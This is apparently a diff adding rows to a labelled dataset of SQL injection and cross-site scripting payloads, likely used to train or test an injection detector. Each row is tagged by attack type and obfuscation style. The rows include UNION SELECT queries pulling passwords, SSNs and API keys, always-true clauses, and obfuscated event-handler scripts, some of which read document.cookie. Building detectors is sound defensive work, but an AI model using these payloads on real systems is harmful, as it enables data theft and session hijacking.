+"6/**/UniON%20seLeCT password,balance FrOM admins-- x",1,sqli,nl_framed,claude
+<BoDy ONERROr=print()>,1,xss,xss_obf,claude
+<svg/onstart=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
+can you show the field <body onpointerrawupdate=alert`1`> when it errors,1,xss,xss_obf,claude
+can you show the field <table oncontentvisibilityautostatechange=top['al'+'ert'](1)> when it errors,1,xss,xss_obf,claude
+1' oR 'a'='y#,1,sqli,quote_breakout,claude
+fetch each logs where 6 equals 9 or true,1,sqli,nl_framed,claude
+4 aND (select count(*) from people)>2/**/,1,sqli,nl_framed,claude
+<svg/onerror=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
+or exists(select uid from users)/*c*/,1,sqli,nl_framed,claude
+can you show the field <svg onpageshow=alert(1)> when it errors,1,xss,xss_obf,claude
+8 oR TrUE,1,sqli,bare_logic,claude
+<img%20src=x	onerror=alert(document.cookie)>,1,xss,xss_obf,claude
+can you show the field <select onbeforetoggle=window['ale'+'rt']`1`> when it errors,1,xss,nl_framed,claude
+9 oR password lIkE '%'-- x,1,sqli,quote_breakout,claude
+8 and (select count(*) from admins)>1-- x,1,sqli,nl_framed,claude
+<keygen onanimationstart=self['al'+'ert']`1`>,1,xss,xss_obf,claude
+<BoDy oneRRor=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
+pull cards where ssn is anything or condition always holds,1,sqli,nl_framed,claude
+3 Or TRue,1,sqli,bare_logic,claude
+please render <svg oncontentvisibilityautostatechange=alert(1)> here for the user,1,xss,xss_obf,claude
+can you show the field <iframe oncontentvisibilityautostatechange=print()> when it errors,1,xss,xss_obf,claude
+0x53 or 0x59=0x82,1,sqli,encoding,claude
+"""><svg onfocus=print()>",1,xss,xss_obf,claude
+admin' or '1'='1,1,sqli,quote_breakout,claude
+"6/**/UnIoN%20SElEcT apikey,balance FroM tokens-- x",1,sqli,nl_framed,claude
+admin'	or '1'='1,1,sqli,quote_breakout,claude
+0x84 oR 0x93=0x59,1,sqli,encoding,claude
+"2/**/uniOn/**/SELECt dob,token FroM members;",1,sqli,nl_framed,claude
+pull all cards where 5 = 7 or true,1,sqli,nl_framed,claude
+<form%09onstart=alert(document.cookie)>,1,xss,xss_obf,claude
+show me the balance of any auth regardless of id,1,sqli,nl_framed,claude
+return the ssn of each members regardless of id,1,sqli,nl_framed,claude
+char(55) Or char(57)=char(52),1,sqli,encoding,claude
+admin' Or 'b'='y/*c*/,1,sqli,quote_breakout,claude
+show me profiles where dob is anything or condition always holds,1,sqli,nl_framed,claude
+or exists(select pwd from profiles),1,sqli,nl_framed,claude
+});eval(atob('YWxlcnQoMSk'));//,1,xss,xss_obf,claude
+show me any people where 5 is 5 or true,1,sqli,nl_framed,claude
+"8	uNiOn/**/seLECT role,password,token FROm orders",1,sqli,nl_framed,claude
+6 anD (select count(*) from accounts)>0;,1,sqli,nl_framed,claude
+<img%09src=x onerror=top['al'+'ert'](1)>,1,xss,xss_obf,claude
+0x20 OR 0x75=0x49,1,sqli,encoding,claude
+root' oR 'a'='z%00,1,sqli,quote_breakout,claude
+please render <body onpointerrawupdate=print()> here for the user,1,xss,xss_obf,claude
+please render <xss onbeforetoggle=top['al'+'ert'](1)> here for the user,1,xss,xss_obf,claude
+please render <input onscrollend=window['ale'+'rt']`1`> here for the user,1,xss,xss_obf,claude
+1' Or 'a'='b;,1,sqli,quote_breakout,claude
+"<imgsrc=x
+onerror=alert`1`>",1,xss,xss_obf,claude
+"""><math onscrollend=print()>",1,xss,xss_obf,claude
+<img%20src=x%09onerror=alert`1`>,1,xss,xss_obf,claude
+4 or 1=4,1,sqli,bare_logic,claude
+1 ANd (select count(*) from members)>0-- ,1,sqli,nl_framed,claude
+please render <embed onload=alert(document.cookie)> here for the user,1,xss,xss_obf,claude
+"1 uNIoN seLeCt token,uid frOM profiles-- ",1,sqli,nl_framed,claude
+<imgsrc=x%09onerror=alert(document.domain)>,1,xss,xss_obf,claude
+retrieve the dob of all sessions regardless of id,1,sqli,nl_framed,claude
+please render <details onanimationstart=alert(document.domain)> here for the user,1,xss,xss_obf,claude
+can you show the field <keygen onanimationstart=print()> when it errors,1,xss,xss_obf,claude
+char(52) OR char(52)=char(48),1,sqli,encoding,claude
+'-confirm(1)-',1,xss,xss_obf,claude
+2 or tRuE,1,sqli,bare_logic,claude
+dump clients where balance is anything or condition always holds,1,sqli,nl_framed,claude
+get cards where password is anything or condition always holds,1,sqli,nl_framed,claude
+<iFrAmE OnERrOR=alert(document.domain)>,1,xss,xss_obf,claude
+<style oncontentvisibilityautostatechange=window['al'+'ert']`1`>,1,xss,xss_obf,claude
+char(51) oR char(49)=char(48),1,sqli,encoding,claude
+0 or 7=7-- ,1,sqli,bare_logic,claude
+<xssonscrollend=alert(1)>,1,xss,xss_obf,claude
+1 or exists(select dob from tokens)-- ,1,sqli,nl_framed,claude
+select the secret of each clients regardless of id,1,sqli,nl_framed,claude
+7 Or 1=9#,1,sqli,bare_logic,claude
+<form onerror=globalThis['al'+'ert']`1`>,1,xss,xss_obf,claude
+<iFrAmE OnERRoR=top['al'+'ert'](1)>,1,xss,xss_obf,claude
+<iFrAmE oNeRrOr=confirm(1)>,1,xss,xss_obf,claude
+<selectonerror=alert`1`>,1,xss,nl_framed,claude
+<math onfocus=globalThis['al'+'ert']`1`>,1,xss,xss_obf,claude
+<audio	ontoggle=confirm(1)>,1,xss,xss_obf,claude
+<frameset onload=globalThis['al'+'ert']`1`>,1,xss,xss_obf,claude
+"""><audio onpageshow=alert(document.cookie)>",1,xss,xss_obf,claude
+9 Or dob LIKE '%',1,sqli,quote_breakout,claude
+<xss onload=window['al'+'ert']`1`>,1,xss,xss_obf,claude
+5 or tRUE,1,sqli,bare_logic,claude
+9 Or secret lIke '%'-- x,1,sqli,quote_breakout,claude
+x' or 'x'='x#,1,sqli,quote_breakout,claude
+1 and (select count(*) from orders)>2/**/,1,sqli,nl_framed,claude
+<svg/oncontentvisibilityautostatechange=alert`1`>,1,xss,xss_obf,claude
+<marquee onanimationstart=top['al'+'ert']`1`>,1,xss,xss_obf,claude
+1 Or exists(select email from auth)-- -,1,sqli,nl_framed,claude
+<style onanimationstart=window['al'+'ert']`1`>,1,xss,xss_obf,claude
+Or exists(select ssn from accounts)/*c*/,1,sqli,nl_framed,claude
+Or exists(select email from logs);,1,sqli,nl_framed,claude
+0x99 Or 0x70=0x63,1,sqli,encoding,claude
+select each orders where 5 = 6 or true,1,sqli,nl_framed,claude
+0x95 or 0x95=0x47,1,sqli,encoding,claude
+"""><input onfocus=alert`1`>",1,xss,xss_obf,claude
+<svg/onscrollend=alert(document.cookie)>,1,xss,xss_obf,claude
+<BoDy oNErROr=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
+give every sessions where 4 = 3 or true,1,sqli,nl_framed,claude
+2 oR 1=8-- ,1,sqli,bare_logic,claude
+<body	onerror=alert(1)>,1,xss,xss_obf,claude
+<xss oncontentvisibilityautostatechange=window['al'+'ert']`1`>,1,xss,xss_obf,claude
+return the password of all clients regardless of id,1,sqli,nl_framed,claude
+give the pwd of each users regardless of id,1,sqli,nl_framed,claude
+admin'Or '1'='1,1,sqli,quote_breakout,claude
+please render <object ontoggle=alert(document.domain)> here for the user,1,xss,xss_obf,claude
+char(52) oR char(55)=char(49),1,sqli,encoding,claude
+<iFrAmE OnerrOr=alert`1`>,1,xss,xss_obf,claude
+pull admins where ssn is anything or condition always holds,1,sqli,nl_framed,claude
+"""><audio onfocus=confirm(1)>",1,xss,xss_obf,claude
+<SvG oNeRRoR=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
+0 oR 1=8,1,sqli,bare_logic,claude
+5 oR 4=3-- ,1,sqli,bare_logic,claude
+6 ANd (select count(*) from logs)>1#,1,sqli,nl_framed,claude
+"8%20UNion%20sEleCt token,pwd FroM members;",1,sqli,nl_framed,claude
+<a href=&#106;avascript:alert(document.domain)>x</a>,1,xss,xss_obf,claude
+3 Or tRuE,1,sqli,bare_logic,claude
+<BoDy OnErrOR=confirm(1)>,1,xss,xss_obf,claude
+please render <input onafterscriptexecute=window['ale'+'rt']`1`> here for the user,1,xss,xss_obf,claude
+<svg/onpointerrawupdate=alert(document.cookie)>,1,xss,xss_obf,claude
+please render <frameset onpointerrawupdate=eval(atob('YWxlcnQoMSk'))> here for the user,1,xss,xss_obf,claude
+retrieve the secret of each admins regardless of id,1,sqli,nl_framed,claude
+<isindex oncontentvisibilityautostatechange=window['al'+'ert']`1`>,1,xss,xss_obf,claude
+<svg/onafterscriptexecute=alert(document.domain)>,1,xss,xss_obf,claude
+3	unIOn sELeCt dob frOm staff-- x,1,sqli,nl_framed,claude
+"<img src=x
+onerror=top['al'+'ert'](1)>",1,xss,xss_obf,claude
+give every people where 1 equals 7 or true,1,sqli,nl_framed,claude
+7 Or true,1,sqli,bare_logic,claude
+5 aNd (select count(*) from users)>3;,1,sqli,nl_framed,claude
+<a href=&#106;avascript:confirm(1)>x</a>,1,xss,xss_obf,claude
+<table onload=self['al'+'ert']`1`>,1,xss,xss_obf,claude
+2 or 9=9%00,1,sqli,bare_logic,claude
+<svg/onanimationstart=top['al'+'ert'](1)>,1,xss,xss_obf,claude
+pull the ssn of all people regardless of id,1,sqli,nl_framed,claude
+<iFrAmE OneRRor=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
+<svg%09onpointerrawupdate=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
+list admins where token is anything or condition always holds,1,sqli,nl_framed,claude
+<img%20src=xonerror=alert(document.domain)>,1,xss,xss_obf,claude
+0x52 or 0x38=0x98,1,sqli,encoding,claude
+get each auth where 7 = 7 or true,1,sqli,nl_framed,claude
+<SvG ONERROR=print()>,1,xss,xss_obf,claude
+<imgsrc=x%09onerror=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
+please render <object onafterscriptexecute=window['ale'+'rt']`1`> here for the user,1,xss,xss_obf,claude
+5 Or 9=2%00,1,sqli,bare_logic,claude
+7 OR 4=4-- -,1,sqli,bare_logic,claude
+can you show the field <input onfocus=confirm(1)> when it errors,1,xss,xss_obf,claude
+<IMG oNERror=alert`1`>,1,xss,xss_obf,claude
+2%20UnIon%20sELECt token FRom logs#,1,sqli,nl_framed,claude
+"4/**/UNIon sElECT pwd,hash,ssn fROM clients%00",1,sqli,nl_framed,claude
+1 oR exists(select balance from members)%00,1,sqli,nl_framed,claude
+<img%09src=xonerror=confirm(1)>,1,xss,xss_obf,claude
+please render <iframe onfocus=print()> here for the user,1,xss,xss_obf,claude
+"""><form ontoggle=alert`1`>",1,xss,xss_obf,claude
+5 oR 3=6-- -,1,sqli,bare_logic,claude
+"""><embed onerror=confirm(1)>",1,xss,xss_obf,claude
+please render <textarea onerror=alert(1)> here for the user,1,xss,xss_obf,claude
+can you show the field <audio onstart=top['al'+'ert'](1)> when it errors,1,xss,xss_obf,claude
+<img%09src=xonerror=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
+<BoDy oNeRRoR=alert(document.cookie)>,1,xss,xss_obf,claude
+pull people where token is anything or condition always holds,1,sqli,nl_framed,claude
+<img%20src=x/onerror=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
+char(51) or char(53)=char(57),1,sqli,encoding,claude
+<style onscrollend=top['al'+'ert']`1`>,1,xss,xss_obf,claude
+admin' oR 'a'='x-- -,1,sqli,quote_breakout,claude
+5 or tRuE,1,sqli,bare_logic,claude
+give the secret of each users regardless of id,1,sqli,nl_framed,claude
+retrieve any members where 4 = 8 or true,1,sqli,nl_framed,claude
+show me people where hash is anything or condition always holds,1,sqli,nl_framed,claude
+select the balance of any users regardless of id,1,sqli,nl_framed,claude
+char(52) Or char(53)=char(49),1,sqli,encoding,claude
+3 or email LiKe '%'-- x,1,sqli,quote_breakout,claude
+char(54) oR char(55)=char(51),1,sqli,encoding,claude
+please render <isindex ontoggle=eval(atob('YWxlcnQoMSk'))> here for the user,1,xss,xss_obf,claude
+<SvG OnERRoR=confirm(1)>,1,xss,xss_obf,claude
+return the hash of all staff regardless of id,1,sqli,nl_framed,claude
+"<marquee
+onerror=top['al'+'ert'](1)>",1,xss,xss_obf,claude
+0x82 oR 0x44=0x50,1,sqli,encoding,claude
+<IMG OneRrOr=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
+x' Or 'a'='x-- -,1,sqli,quote_breakout,claude
+can you show the field <style onanimationstart=alert`1`> when it errors,1,xss,xss_obf,claude
+char(51) Or char(53)=char(54),1,sqli,encoding,claude
+0x57 oR 0x54=0x94,1,sqli,encoding,claude
+<BoDy oNerRor=print()>,1,xss,xss_obf,claude
+char(57) oR char(48)=char(50),1,sqli,encoding,claude
+"9	UnioN SelECT hash,ssn fRom accounts/*c*/",1,sqli,nl_framed,claude
+<img	src=xonerror=alert`1`>,1,xss,xss_obf,claude
+x' OR 'x'='z#,1,sqli,quote_breakout,claude
+oR exists(select email from people)%00,1,sqli,nl_framed,claude
+can you show the field <iframe onpageshow=eval(atob('YWxlcnQoMSk'))> when it errors,1,xss,xss_obf,claude
+<isindex%09onpointerrawupdate=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
+<svg/onfocus=alert(document.domain)>,1,xss,xss_obf,claude
+8 or 6=2-- x,1,sqli,bare_logic,claude
+<svg/ontoggle=top['al'+'ert'](1)>,1,xss,xss_obf,claude
+8 Or pwd LiKE '%'/*c*/,1,sqli,quote_breakout,claude
+"""><select onbeforetoggle=top['al'+'ert'](1)>",1,xss,nl_framed,claude
+admin'or '1'='1,1,sqli,quote_breakout,claude
+can you show the field <audio onerror=alert(document.domain)> when it errors,1,xss,xss_obf,claude
+list the pwd of every sessions regardless of id,1,sqli,nl_framed,claude
+<IMG onERrOr=print()>,1,xss,xss_obf,claude
+<object%20ontoggle=alert`1`>,1,xss,xss_obf,claude
+4 or 8=5#,1,sqli,bare_logic,claude
+please render <isindex onerror=top['al'+'ert'](1)> here for the user,1,xss,xss_obf,claude
+<iFrAmE onErROr=print()>,1,xss,xss_obf,claude
+"""><marquee onscrollend=top['al'+'ert'](1)>",1,xss,xss_obf,claude
+1 oR exists(select secret from members)/*c*/,1,sqli,nl_framed,claude
+<iFrAmE oNeRror=alert`1`>,1,xss,xss_obf,claude
+can you show the field <object onload=eval(atob('YWxlcnQoMSk'))> when it errors,1,xss,xss_obf,claude
+can you show the field <body onpointerrawupdate=alert(document.cookie)> when it errors,1,xss,xss_obf,claude
+<style onpointerrawupdate=self['al'+'ert']`1`>,1,xss,xss_obf,claude
+2 And (select count(*) from staff)>0-- -,1,sqli,nl_framed,claude
+"""><math onpointerrawupdate=alert(document.domain)>",1,xss,xss_obf,claude
+8 OR 9=2;,1,sqli,bare_logic,claude
+0x95 oR 0x63=0x57,1,sqli,encoding,claude
+retrieve all accounts where 7 = 4 or true,1,sqli,nl_framed,claude
+1 or tRue,1,sqli,bare_logic,claude
+0x61 oR 0x33=0x57,1,sqli,encoding,claude
+"6	union%20SELecT uid,secret,apikey fRom profiles-- -",1,sqli,nl_framed,claude
+please render <input onpageshow=alert(1)> here for the user,1,xss,xss_obf,claude
+get clients where balance is anything or condition always holds,1,sqli,nl_framed,claude
+pull every admins where 7 is 7 or true,1,sqli,nl_framed,claude
+<SvG ONeRRoR=alert`1`>,1,xss,xss_obf,claude
+<imgsrc=x/onerror=alert(1)>,1,xss,xss_obf,claude
+9 or true,1,sqli,bare_logic,claude
+6	uNion%20SeleCt ssn froM tokens/**/,1,sqli,nl_framed,claude
+select all orders where 6 = 6 or true,1,sqli,nl_framed,claude
+<iFrAmE onErROr=alert(1)>,1,xss,xss_obf,claude
+9 Or hash LIKe '%'%00,1,sqli,quote_breakout,claude
+'-alert(1)-',1,xss,xss_obf,claude
+0x37 Or 0x30=0x30,1,sqli,encoding,claude
+0x97 OR 0x29=0x18,1,sqli,encoding,claude
+6 OR 5=7-- ,1,sqli,bare_logic,claude
+8 or hash LIKe '%';,1,sqli,quote_breakout,claude
+9 or 2=4/*c*/,1,sqli,bare_logic,claude
+give the ssn of all auth regardless of id,1,sqli,nl_framed,claude
+return the secret of every logs regardless of id,1,sqli,nl_framed,claude
+"""><marquee onafterscriptexecute=eval(atob('YWxlcnQoMSk'))>",1,xss,xss_obf,claude
+"7 uniON SeLeCT email,dob froM members#",1,sqli,nl_framed,claude
+<BoDy OnerroR=alert`1`>,1,xss,xss_obf,claude
+give the role of each cards regardless of id,1,sqli,nl_framed,claude
+<SvG oNeRrOr=print()>,1,xss,xss_obf,claude
+<select%09onfocus=top['al'+'ert'](1)>,1,xss,nl_framed,claude
+"<img
+src=x%20onerror=alert(document.cookie)>",1,xss,xss_obf,claude
+get every clients where 3 equals 4 or true,1,sqli,nl_framed,claude
+"""><frameset onanimationstart=alert`1`>",1,xss,xss_obf,claude
+9 and (select count(*) from logs)>0;,1,sqli,nl_framed,claude
+root' Or 'y'='b#,1,sqli,quote_breakout,claude
+list people where hash is anything or condition always holds,1,sqli,nl_framed,claude
+retrieve profiles where uid is anything or condition always holds,1,sqli,nl_framed,claude
+dump admins where role is anything or condition always holds,1,sqli,nl_framed,claude
+1 AnD (select count(*) from logs)>3,1,sqli,nl_framed,claude
+admin'	OR '1'='1,1,sqli,quote_breakout,claude
+list the ssn of any users regardless of id,1,sqli,nl_framed,claude
+Or exists(select balance from users),1,sqli,nl_framed,claude
+5 OR token LIKE '%'/**/,1,sqli,quote_breakout,claude
+<math onscrollend=globalThis['al'+'ert']`1`>,1,xss,xss_obf,claude
+3 OR tRuE,1,sqli,bare_logic,claude
+9 OR 7=1/*c*/,1,sqli,bare_logic,claude
+<img src=x%20onerror=alert(document.cookie)>,1,xss,xss_obf,claude
+1' Or 'b'='z/**/,1,sqli,quote_breakout,claude
+"""><math onpageshow=alert(document.domain)>",1,xss,xss_obf,claude
+pull all tokens where 2 equals 2 or true,1,sqli,nl_framed,claude
+please render <form onload=eval(atob('YWxlcnQoMSk'))> here for the user,1,xss,xss_obf,claude
+"""><svg onfocus=window['ale'+'rt']`1`>",1,xss,xss_obf,claude
+please render <embed onerror=alert(1)> here for the user,1,xss,xss_obf,claude
+4 oR TruE,1,sqli,bare_logic,claude
+8 OR email likE '%'/*c*/,1,sqli,quote_breakout,claude
+<BoDy onERROr=alert(document.cookie)>,1,xss,xss_obf,claude
+please render <style onpointerrawupdate=eval(atob('YWxlcnQoMSk'))> here for the user,1,xss,xss_obf,claude
+<svg/onanimationstart=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
+list any users where 8 equals 9 or true,1,sqli,nl_framed,claude
+x' Or 'z'='b-- -,1,sqli,quote_breakout,claude
+<BoDy ONERrOR=print()>,1,xss,xss_obf,claude
+please render <object onstart=print()> here for the user,1,xss,xss_obf,claude
+<body onpageshow=top['al'+'ert']`1`>,1,xss,xss_obf,claude
+8 OR uid like '%'%00,1,sqli,quote_breakout,claude
+3 Or balance Like '%'-- ,1,sqli,quote_breakout,claude
+<BoDy ONERrOR=alert`1`>,1,xss,xss_obf,claude
+dump users where uid is anything or condition always holds,1,sqli,nl_framed,claude
+admin' or '1'='1,1,sqli,quote_breakout,claude
+admin' oR 'b'='y-- x,1,sqli,quote_breakout,claude
+<img src=xonerror=alert(document.cookie)>,1,xss,xss_obf,claude
+can you show the field <body oncontentvisibilityautostatechange=alert(1)> when it errors,1,xss,xss_obf,claude
+"""><object onfocus=confirm(1)>",1,xss,xss_obf,claude
+0x33 oR 0x98=0x19,1,sqli,encoding,claude
+<audio onpageshow=top['al'+'ert']`1`>,1,xss,xss_obf,claude
+1 Or dob like '%'/**/,1,sqli,quote_breakout,claude
+return the pwd of all staff regardless of id,1,sqli,nl_framed,claude
+can you show the field <embed onanimationstart=confirm(1)> when it errors,1,xss,xss_obf,claude
+0x55 OR 0x94=0x27,1,sqli,encoding,claude
+list the hash of all staff regardless of id,1,sqli,nl_framed,claude
+"""><isindex ontoggle=eval(atob('YWxlcnQoMSk'))>",1,xss,xss_obf,claude
+3 ANd (select count(*) from members)>1#,1,sqli,nl_framed,claude
+<IMG OneRROR=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
+list each logs where 1 = 1 or true,1,sqli,nl_framed,claude
+retrieve admins where dob is anything or condition always holds,1,sqli,nl_framed,claude
+can you show the field <table onscrollend=print()> when it errors,1,xss,xss_obf,claude
+4 or role liKe '%'/*c*/,1,sqli,quote_breakout,claude
+<img%09src=x%09onerror=alert(document.domain)>,1,xss,xss_obf,claude
+"3%20UNiON%20SelECT balance,secret,email froM people",1,sqli,nl_framed,claude
+"<input
+onerror=confirm(1)>",1,xss,xss_obf,claude
+char(49) or char(56)=char(53),1,sqli,encoding,claude
+<svg onanimationstart=window['al'+'ert']`1`>,1,xss,xss_obf,claude
+<frameset onfocus=window['al'+'ert']`1`>,1,xss,xss_obf,claude
+<iFrAmE ONERrOR=alert(1)>,1,xss,xss_obf,claude
+4 Or hash LIkE '%'-- ,1,sqli,quote_breakout,claude
+get the password of all clients regardless of id,1,sqli,nl_framed,claude
+root' oR 'a'='a%00,1,sqli,quote_breakout,claude
+9 Union SeLEct uid froM users-- ,1,sqli,nl_framed,claude
+root' oR 'a'='a-- -,1,sqli,quote_breakout,claude
+<img%20src=x%20onerror=alert(1)>,1,xss,xss_obf,claude
+0x59 or 0x92=0x18,1,sqli,encoding,claude
+char(48) oR char(55)=char(56),1,sqli,encoding,claude
+<svg/onscrollend=alert(document.domain)>,1,xss,xss_obf,claude
+0x81 or 0x17=0x23,1,sqli,encoding,claude
+char(49) Or char(52)=char(56),1,sqli,encoding,claude
+<select/onstart=top['al'+'ert'](1)>,1,xss,nl_framed,claude
+<img%09src=xonerror=alert`1`>,1,xss,xss_obf,claude
+fetch the balance of all auth regardless of id,1,sqli,nl_framed,claude
+'-window['ale'+'rt']`1`-',1,xss,xss_obf,claude
+admin' oR 'x'='x/**/,1,sqli,quote_breakout,claude
+<BoDy ONeRror=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
+pull members where hash is anything or condition always holds,1,sqli,nl_framed,claude
+retrieve logs where token is anything or condition always holds,1,sqli,nl_framed,claude
+<svg/onpageshow=alert(document.cookie)>,1,xss,xss_obf,claude
+"""><svg onload=alert`1`>",1,xss,xss_obf,claude
+0x54 Or 0x51=0x48,1,sqli,encoding,claude
+can you show the field <isindex onerror=eval(atob('YWxlcnQoMSk'))> when it errors,1,xss,xss_obf,claude
+8 unIoN sElEct dob frOM people/**/,1,sqli,nl_framed,claude
+can you show the field <video onload=eval(atob('YWxlcnQoMSk'))> when it errors,1,xss,xss_obf,claude
+1' OR 'b'='a#,1,sqli,quote_breakout,claude
+0x16 OR 0x50=0x77,1,sqli,encoding,claude
+return the secret of each profiles regardless of id,1,sqli,nl_framed,claude
+1 oR exists(select uid from users)/**/,1,sqli,nl_framed,claude
+"2%20UNioN/**/SELect apikey,token From users-- x",1,sqli,nl_framed,claude
+"<img
+src=x	onerror=eval(atob('YWxlcnQoMSk'))>",1,xss,xss_obf,claude
+6 or tRue,1,sqli,bare_logic,claude
+3 Or hash LiKe '%';,1,sqli,quote_breakout,claude
+<svg onerror=alert`1`>,1,xss,xss_obf,claude
+"""><xss onscrollend=alert`1`>",1,xss,xss_obf,claude
+<textarea onscrollend=self['al'+'ert']`1`>,1,xss,xss_obf,claude
+<embed	onbeforetoggle=top['al'+'ert'](1)>,1,xss,xss_obf,claude
+"<imgsrc=x
+onerror=alert(document.cookie)>",1,xss,xss_obf,claude
+<img%20src=x onerror=top['al'+'ert'](1)>,1,xss,xss_obf,claude
+0x66 OR 0x76=0x99,1,sqli,encoding,claude
+<img src=x%09onerror=alert`1`>,1,xss,xss_obf,claude
+<details	onfocus=alert(1)>,1,xss,xss_obf,claude
+"4%20unION sEleCt role,uid FRoM sessions/**/",1,sqli,nl_framed,claude
+char(48) oR char(57)=char(53),1,sqli,encoding,claude
+0x39 oR 0x80=0x98,1,sqli,encoding,claude
+0x67 or 0x24=0x42,1,sqli,encoding,claude
+select the dob of any sessions regardless of id,1,sqli,nl_framed,claude
+get logs where pwd is anything or condition always holds,1,sqli,nl_framed,claude
+<BoDy ONERROr=top['al'+'ert'](1)>,1,xss,xss_obf,claude
+"9	UnION%20seLeCt email,apikey FrOM people%00",1,sqli,nl_framed,claude
+can you show the field <select onscrollend=confirm(1)> when it errors,1,xss,nl_framed,claude
+3 Or password liKe '%';,1,sqli,quote_breakout,claude
+admin' or 'z'='a#,1,sqli,quote_breakout,claude
+"8/**/uNIOn%20SEleCt role,password,pwd From clients;",1,sqli,nl_framed,claude
+0x31 oR 0x76=0x49,1,sqli,encoding,claude
+<imgsrc=xonerror=alert(document.cookie)>,1,xss,xss_obf,claude
+return logs where apikey is anything or condition always holds,1,sqli,nl_framed,claude
+8 OR ssn LikE '%'-- ,1,sqli,quote_breakout,claude
+x' Or 'a'='y#,1,sqli,quote_breakout,claude
+or exists(select email from profiles)-- -,1,sqli,nl_framed,claude
+"""><math onfocus=window['ale'+'rt']`1`>",1,xss,xss_obf,claude
+5 ANd (select count(*) from staff)>0%00,1,sqli,nl_framed,claude
+return cards where ssn is anything or condition always holds,1,sqli,nl_framed,claude
+0 or 5=5-- ,1,sqli,bare_logic,claude
+list accounts where token is anything or condition always holds,1,sqli,nl_framed,claude
+admin' oR 'y'='x-- -,1,sqli,quote_breakout,claude
+4 Or 7=7/*c*/,1,sqli,bare_logic,claude
+8 aNd (select count(*) from accounts)>0-- -,1,sqli,nl_framed,claude
+2 OR 5=7-- -,1,sqli,bare_logic,claude
+5 OR trUe,1,sqli,bare_logic,claude
+2 OR 5=7%00,1,sqli,bare_logic,claude
+can you show the field <svg onload=alert`1`> when it errors,1,xss,xss_obf,claude
+admin' oR 'b'='y/*c*/,1,sqli,quote_breakout,claude
+1 oR 3=7-- -,1,sqli,bare_logic,claude
+3 oR balance LIKe '%'%00,1,sqli,quote_breakout,claude
+<xss/onscrollend=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
+<svg/onanimationstart=alert`1`>,1,xss,xss_obf,claude
+<select/onfocus=alert`1`>,1,xss,nl_framed,claude
+<BoDy OneRRor=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
+char(53) or char(53)=char(57),1,sqli,encoding,claude
+3 UNIoN/**/seLEcT role FrOM clients,1,sqli,nl_framed,claude
+"2%20UNion%20SELeCT uid,pwd,ssn FroM cards",1,sqli,nl_framed,claude
+<SvG oNerrOR=print()>,1,xss,xss_obf,claude
+"""><embed onfocus=alert(document.cookie)>",1,xss,xss_obf,claude
+<iFrAmE Onerror=alert`1`>,1,xss,xss_obf,claude
+8 ANd (select count(*) from admins)>0,1,sqli,nl_framed,claude
+"9	union selEct token,pwd,hash FROM accounts/**/",1,sqli,nl_framed,claude
+7 and (select count(*) from tokens)>1-- x,1,sqli,nl_framed,claude
+<details/ontoggle=alert(1)>,1,xss,xss_obf,claude
+can you show the field <form onload=window['ale'+'rt']`1`> when it errors,1,xss,xss_obf,claude
+7 OR 5=6/**/,1,sqli,bare_logic,claude
+<a href=&#106;avascript:top['al'+'ert'](1)>x</a>,1,xss,xss_obf,claude
+0x77 or 0x52=0x32,1,sqli,encoding,claude
+return the balance of each tokens regardless of id,1,sqli,nl_framed,claude
+1 or uid likE '%'-- ,1,sqli,quote_breakout,claude
+0x32 oR 0x74=0x45,1,sqli,encoding,claude
+<formonanimationstart=alert(document.cookie)>,1,xss,xss_obf,claude
+dump the apikey of every tokens regardless of id,1,sqli,nl_framed,claude
+<IMG ONerROR=alert(1)>,1,xss,xss_obf,claude
+can you show the field <object onscrollend=alert`1`> when it errors,1,xss,xss_obf,claude
+give the balance of every sessions regardless of id,1,sqli,nl_framed,claude
+select the hash of all clients regardless of id,1,sqli,nl_framed,claude
+admin' Or '1'='1,1,sqli,quote_breakout,claude
+or exists(select uid from auth)-- -,1,sqli,nl_framed,claude
+'-alert(document.domain)-',1,xss,xss_obf,claude
+<img%20src=xonerror=print()>,1,xss,xss_obf,claude
+7 oR 7=9%00,1,sqli,bare_logic,claude
+fetch every clients where 6 = 3 or true,1,sqli,nl_framed,claude
+list any admins where 5 equals 7 or true,1,sqli,nl_framed,claude
+4 aND (select count(*) from staff)>3,1,sqli,nl_framed,claude
+"""><details onafterscriptexecute=confirm(1)>",1,xss,xss_obf,claude
+show me any users where 5 = 8 or true,1,sqli,nl_framed,claude
+oR exists(select pwd from staff),1,sqli,nl_framed,claude
+please render <keygen onscrollend=window['ale'+'rt']`1`> here for the user,1,xss,xss_obf,claude
+<svg/onpointerrawupdate=top['al'+'ert'](1)>,1,xss,xss_obf,claude
+5 aND (select count(*) from cards)>1;,1,sqli,nl_framed,claude
+"1	unioN/**/sEleCT uid,pwd FRom profiles;",1,sqli,nl_framed,claude
+char(50) Or char(48)=char(54),1,sqli,encoding,claude
+7 Or dob lIke '%';,1,sqli,quote_breakout,claude
+char(48) or char(50)=char(52),1,sqli,encoding,claude
+0x80 oR 0x31=0x84,1,sqli,encoding,claude
+"""><style onerror=top['al'+'ert'](1)>",1,xss,xss_obf,claude
+<select onbeforetoggle=self['al'+'ert']`1`>,1,xss,nl_framed,claude
+select the hash of any profiles regardless of id,1,sqli,nl_framed,claude
+"9/**/uNIOn SElECt password,ssn,dob FroM users#",1,sqli,nl_framed,claude
+retrieve any sessions where 4 is 9 or true,1,sqli,nl_framed,claude
+<keygen onbeforetoggle=window['al'+'ert']`1`>,1,xss,xss_obf,claude
+can you show the field <style onbeforetoggle=alert`1`> when it errors,1,xss,xss_obf,claude
+<mathonfocus=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
+retrieve the password of any cards regardless of id,1,sqli,nl_framed,claude
